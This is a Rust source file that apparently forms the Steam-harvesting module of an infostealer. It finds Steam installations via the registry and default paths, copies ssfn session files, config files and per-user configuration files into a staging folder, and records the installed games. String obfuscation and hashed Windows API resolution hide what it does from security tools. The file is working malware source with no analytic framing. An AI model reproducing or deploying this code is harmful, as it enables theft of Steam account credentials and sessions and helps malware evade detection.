use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use std::path::PathBuf;
use std::fs;
use winapi::um::winreg::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::{KEY_READ, REG_SZ};
use winapi::shared::minwindef::DWORD;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let steam_paths = detect_steam_paths().await;
    if steam_paths.is_empty() {
        return Ok(());
    }

    let output_dir = sprotect!("C:\\temp\\extract\\Games\\Steam");
    std::fs::create_dir_all(&output_dir)?;

    for steam_path in steam_paths {
        extract_steam_data(&steam_path, &output_dir).await?;
    }

    Ok(())
}

async fn detect_steam_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Some(registry_path) = get_steam_registry_path().await {
        paths.push(registry_path);
    }

    let default_paths = vec![
        sprotect!("C:\\Program Files (x86)\\Steam"),
        sprotect!("C:\\Program Files\\Steam"),
        format!("{}{}", std::env::var(sprotect!("PROGRAMFILES")).unwrap_or_default(), sprotect!("\\Steam")),
        format!("{}{}", std::env::var(sprotect!("PROGRAMFILES(X86)")).unwrap_or_default(), sprotect!("\\Steam")),
    ];

    for path_str in default_paths {
        let path = PathBuf::from(path_str);
        if path.exists() && !paths.contains(&path) {
            paths.push(path);
        }
    }

    paths
}

async fn get_steam_registry_path() -> Option<PathBuf> {
    unsafe {
        let registry_keys = vec![
            (HKEY_CURRENT_USER, sprotect!("Software\\Valve\\Steam")),
            (HKEY_LOCAL_MACHINE, sprotect!("SOFTWARE\\Valve\\Steam")),
            (HKEY_LOCAL_MACHINE, sprotect!("SOFTWARE\\WOW6432Node\\Valve\\Steam")),
        ];

        for (hkey, subkey) in registry_keys {
            let mut key: *mut std::ffi::c_void = std::ptr::null_mut();
            let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();

            if HashedAPIs::reg_open_key_ex_w(
                hkey as *mut _,
                subkey_wide.as_ptr(),
                0,
                KEY_READ,
                &mut key
            ) == 0 {
                let mut buffer = [0u16; 1024];
                let mut buffer_size: DWORD = (buffer.len() * 2) as DWORD;
                let value_names = vec![sprotect!("SteamPath"), sprotect!("InstallPath")];

                for value_name in value_names {
                    let value_name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();

                    if HashedAPIs::reg_query_value_ex_w(
                        key,
                        value_name_wide.as_ptr(),
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                        buffer.as_mut_ptr() as *mut u8,
                        &mut buffer_size,
                    ) == 0 {
                        let len = (buffer_size / 2) as usize;
                        if len > 0 {
                            let path_string = String::from_utf16_lossy(&buffer[..len.saturating_sub(1)]);
                            HashedAPIs::reg_close_key(key);
                            return Some(PathBuf::from(path_string));
                        }
                    }
                }

                HashedAPIs::reg_close_key(key);
            }
        }
    }
    None
}

async fn extract_steam_data(steam_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    extract_ssfn_files(steam_path, output_dir).await?;
    extract_config_files(steam_path, output_dir).await?;
    extract_userdata(steam_path, output_dir).await?;
    extract_registry_apps(output_dir).await?;
    Ok(())
}

async fn extract_ssfn_files(steam_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(steam_path) {
        for entry in entries.flatten() {
            let file_path = entry.path();
            if let Some(file_name) = file_path.file_name() {
                let file_name_str = file_name.to_string_lossy();
                
                if file_name_str.starts_with(&sprotect!("ssfn")) && file_path.is_file() {
                    let dest_path = format!("{}\\{}", output_dir, file_name_str);
                    fs::copy(&file_path, dest_path).ok();
                }
            }
        }
    }
    Ok(())
}

async fn extract_config_files(steam_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_path = steam_path.join(sprotect!("config"));
    if config_path.exists() {
        let config_output = format!("{}{}", output_dir, sprotect!("\\config"));
        std::fs::create_dir_all(&config_output)?;

        if let Ok(entries) = fs::read_dir(&config_path) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                if file_path.is_file() {
                    if let Some(file_name) = file_path.file_name() {
                        let dest_path = format!("{}\\{}", config_output, file_name.to_string_lossy());
                        fs::copy(&file_path, dest_path).ok();
                    }
                }
            }
        }
    }
    Ok(())
}

async fn extract_userdata(steam_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let userdata_path = steam_path.join(sprotect!("userdata"));
    if userdata_path.exists() {
        let userdata_output = format!("{}{}", output_dir, sprotect!("\\userdata"));
        std::fs::create_dir_all(&userdata_output)?;

        if let Ok(entries) = fs::read_dir(&userdata_path) {
            for entry in entries.flatten() {
                let user_dir = entry.path();
                if user_dir.is_dir() {
                    let user_name = user_dir.file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("")
                        .to_string();
                    let user_output = format!("{}\\{}", userdata_output, user_name);
                    std::fs::create_dir_all(&user_output)?;

                    let important_files = vec![
                        sprotect!("config\\localconfig.vdf"),
                        sprotect!("7\\remote\\sharedconfig.vdf"),
                        sprotect!("config\\shortcuts.vdf"),
                    ];

                    for file_rel_path in important_files {
                        let file_path = user_dir.join(&file_rel_path);
                        if file_path.exists() {
                            let dest_path = format!("{}\\{}", user_output, file_rel_path.replace("\\", "_"));
                            fs::copy(&file_path, dest_path).ok();
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

async fn extract_registry_apps(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut key: *mut std::ffi::c_void = std::ptr::null_mut();
        let subkey = sprotect!("Software\\Valve\\Steam\\Apps");
        let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();

        if HashedAPIs::reg_open_key_ex_w(
            HKEY_CURRENT_USER as *mut _,
            subkey_wide.as_ptr(),
            0,
            KEY_READ,
            &mut key
        ) == 0 {
            let mut games_list = Vec::new();
            let mut index = 0;

            loop {
                let mut app_id = [0u16; 256];
                let mut app_id_size = app_id.len() as DWORD;

                if HashedAPIs::reg_enum_key_ex_w(
                    key,
                    index,
                    app_id.as_mut_ptr(),
                    &mut app_id_size,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                ) != 0 {
                    break;
                }

                let app_id_str = String::from_utf16_lossy(&app_id[..app_id_size as usize]);
                
                let mut app_key: *mut std::ffi::c_void = std::ptr::null_mut();
                let app_subkey = format!("{}\\{}", subkey, app_id_str);
                let app_subkey_wide: Vec<u16> = app_subkey.encode_utf16().chain(std::iter::once(0)).collect();

                if HashedAPIs::reg_open_key_ex_w(
                    HKEY_CURRENT_USER as *mut _,
                    app_subkey_wide.as_ptr(),
                    0,
                    KEY_READ,
                    &mut app_key
                ) == 0 {
                    let mut buffer = [0u16; 1024];
                    let mut buffer_size: DWORD = (buffer.len() * 2) as DWORD;
                    let name_value = sprotect!("Name");
                    let name_value_wide: Vec<u16> = name_value.encode_utf16().chain(std::iter::once(0)).collect();

                    if HashedAPIs::reg_query_value_ex_w(
                        app_key,
                        name_value_wide.as_ptr(),
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                        buffer.as_mut_ptr() as *mut u8,
                        &mut buffer_size,
                    ) == 0 {
                        let len = (buffer_size / 2) as usize;
                        if len > 0 {
                            let game_name = String::from_utf16_lossy(&buffer[..len.saturating_sub(1)]);
                            games_list.push(format!("{}: {}", app_id_str, game_name));
                        }
                    }

                    HashedAPIs::reg_close_key(app_key);
                }

                index += 1;
            }

            HashedAPIs::reg_close_key(key);

            if !games_list.is_empty() {
                let games_file = format!("{}{}", output_dir, sprotect!("\\steam_games.txt"));
                fs::write(games_file, games_list.join("\n")).ok();
            }
        }
    }
    Ok(())
}